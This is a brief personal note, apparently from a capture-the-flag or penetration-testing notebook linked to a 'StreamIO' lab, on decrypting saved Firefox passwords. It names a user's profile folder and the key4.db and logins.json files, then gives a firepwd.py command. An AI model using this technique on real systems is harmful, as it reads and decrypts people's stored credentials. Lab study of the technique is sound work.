Firefox Cache passwords extract:
First go to the AppData file session for the user:
```powershell
C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release
```
Then extract both files key4.db and logins.json and use the firepwd.py utility:
```python3
python3 firepwd.py key4.db logins.json
```
Examples:
[[StreamIO#^9a4b0a]]



